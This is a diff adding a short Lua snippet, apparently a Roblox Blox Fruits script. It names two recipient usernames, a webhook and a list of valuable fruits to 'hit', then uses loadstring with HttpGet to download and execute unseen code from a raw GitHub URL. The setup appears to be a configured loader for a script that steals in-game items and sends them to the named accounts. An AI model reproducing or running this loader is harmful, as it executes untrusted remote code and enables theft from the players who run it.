@@ -1,0 +1,7 @@
+```lua
+Webhook = "revolt-pgn"
+Usernames = {"ryu_kun0318", "ryou_989"}
+FruitsToHit = {"Kitsune-Kitsune", "dragon-dragon", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+```
